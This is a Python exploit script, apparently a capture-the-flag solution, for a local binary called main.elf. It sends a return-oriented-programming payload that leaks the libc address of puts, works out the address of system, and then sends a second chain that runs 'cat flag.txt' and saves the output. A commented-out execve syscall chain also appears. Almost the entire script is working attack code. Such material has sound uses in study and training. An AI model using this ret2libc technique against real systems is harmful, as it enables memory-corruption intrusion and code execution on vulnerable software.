#!/usr/bin/env python
from __future__ import print_function

import struct
import subprocess
import time

system_offset = 283536
puts_offset = 456336
puts_plt = 0x400590
puts_got = 0x406018
command_addr = 0x4006e2

r = subprocess.Popen("./main.elf".split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE)
#r = pwn.process("strace ./main.elf".split())
#r = pwn.gdb.debug("./main.elf", gdbscript="b* command+162\nc")

payload = ""
payload += struct.pack("<Q", 0x402d28) # ret: pop rdi ; ret
payload += struct.pack("<Q", puts_got) # rdi: puts_got
payload += struct.pack("<Q", puts_plt) # ret: puts_plt
payload += struct.pack("<Q", command_addr) # ret: command_addr
payload += "\xaa" * (0x70 - len(payload))
payload += struct.pack("<Q", 0x402d28) # [start] call rax -> pop rdi ; ret

payload_str = payload.encode("hex")
payload_str = "\\x" + "\\x".join(payload_str[i:i+2] for i in range(0, len(payload_str), 2))
print("PAYLOAD: %s" % payload_str)

r.stdin.write(payload)
r.stdout.readline()
r.stdout.readline()
puts_leak = r.stdout.readline()
puts_leak = puts_leak.rstrip('\x0a')
puts_leak += "\0" * (8 - len(puts_leak))
puts_leak = struct.unpack("<Q", puts_leak)[0]
print("puts leak: 0x%x" % puts_leak)

libc_base = puts_leak - puts_offset
system_addr = libc_base + system_offset
print("system addr: 0x%x" % system_addr)

payload2 = ""
payload2 += struct.pack("<Q", 0x402d28) # ret: pop rdi ; ret
payload2 += struct.pack("<Q", 0x40406c) # rdi: cat flag.txt
payload2 += struct.pack("<Q", system_addr) # ret: system
"""
payload2 += struct.pack("<Q", 0) # rbp: 0
payload2 += struct.pack("<Q", 0x403474) # ret: xchg eax, ebp ; ret / eax: 0, ebp: ?
payload2 += struct.pack("<Q", 0x40290f) # ret: xchg eax, edx ; ret / eax: ?, edx: 0
payload2 += struct.pack("<Q", 0x402d2a) # ret: nop ; pop rbp ; ret
payload2 += struct.pack("<Q", 59) # rbp: 59
payload2 += struct.pack("<Q", 0x403474) # ret: xchg eax, ebp ; ret / eax: 59, ebp: ?
payload2 += struct.pack("<Q", 0x403ac2) # ret: syscall
"""
payload2 += "\xaa" * (0x70 - len(payload2))
payload2 += struct.pack("<Q", 0x402d28) # [start] call rax -> pop rdi ; ret

payload2_str = payload2.encode("hex")
payload2_str = "\\x" + "\\x".join(payload2_str[i:i+2] for i in range(0, len(payload2_str), 2))
print("PAYLOAD2: %s" % payload2_str)

r.stdin.write(payload2)

f = open("./solution.txt", "w")

while True:
  line = r.stdout.readline()
  if not line:
    f.close()
    break
  #the real code does filtering here
  f.write(line)
  print("FLAG:", line.rstrip())

